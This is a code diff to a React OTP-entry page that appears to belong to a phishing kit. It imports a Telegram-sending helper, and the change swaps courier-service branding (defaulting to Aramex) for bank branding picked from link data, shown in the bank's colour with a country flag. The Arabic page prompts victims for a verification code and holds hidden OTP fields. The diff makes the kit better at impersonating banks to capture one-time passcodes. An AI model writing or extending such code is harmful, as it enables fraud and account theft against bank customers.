@@ -2,13 +2,14 @@ import { useState, useEffect, useRef } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { getServiceBranding } from "@/lib/serviceLogos";
-import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
+import BankBrandedLayout from "@/components/BankBrandedLayout";
 import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { getBankById } from "@/lib/banks";
+import { getCountryByCode } from "@/lib/countries";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -26,12 +27,14 @@ const PaymentOTPForm = () => {
 
   // Get customer info from link data (cross-device compatible)
   const customerInfo = linkData?.payload?.customerInfo || {};
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const serviceName = linkData?.payload?.service_name || 'دفع فاتورة';
 
-  // Get country from link data
+  // Get bank and country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
+  const selectedBankId = linkData?.payload?.selectedBank || '';
+  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
+  const selectedCountryData = getCountryByCode(selectedCountry);
+  const bankColor = selectedBank?.color || '#004B87';
 
   const shippingInfo = linkData?.payload as any;
 
@@ -253,20 +256,20 @@ const PaymentOTPForm = () => {
   const hasAnyDigit = otp.some(digit => digit !== "");
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
+    <BankBrandedLayout
+      bankId={selectedBankId}
       amount={formattedAmount}
       title="رمز التحقق"
-      description={`أدخل رمز التحقق لخدمة ${serviceName}`}
+      description="أدخل رمز التحقق لتأكيد العملية"
       icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      countryFlag={selectedCountryData?.flag}
     >
       {/* Title Section */}
       <div className="text-center mb-6 sm:mb-8">
         <div 
           className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: bankColor
           }}
         >
           <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
@@ -279,8 +282,8 @@ const PaymentOTPForm = () => {
       <div 
         className="rounded-lg p-3 sm:p-4 mb-6"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `${bankColor}10`,
+          border: `1px solid ${bankColor}30`
         }}
       >
         <p className="text-xs sm:text-sm text-center">
@@ -306,8 +309,8 @@ const PaymentOTPForm = () => {
                 onPaste={handlePaste}
                 className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
                 style={{
-                  borderColor: digit ? branding.colors.primary : undefined,
-                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
+                  borderColor: digit ? bankColor : undefined,
+                  backgroundColor: digit ? `${bankColor}08` : undefined
                 }}
                 disabled={attempts >= 3}
                 autoComplete="off"
@@ -353,7 +356,7 @@ const PaymentOTPForm = () => {
           style={{
             background: attempts >= 3 
               ? '#666' 
-              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+              : bankColor
           }}
         >
           {attempts >= 3 ? (
@@ -371,7 +374,7 @@ const PaymentOTPForm = () => {
             type="button"
             variant="ghost"
             className="w-full mt-3"
-            style={{ color: branding.colors.primary }}
+            style={{ color: bankColor }}
             onClick={() => {
               setCountdown(60);
               toast({
@@ -397,7 +400,7 @@ const PaymentOTPForm = () => {
         <input type="text" name="otp" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+    </BankBrandedLayout>
   );
 };
 
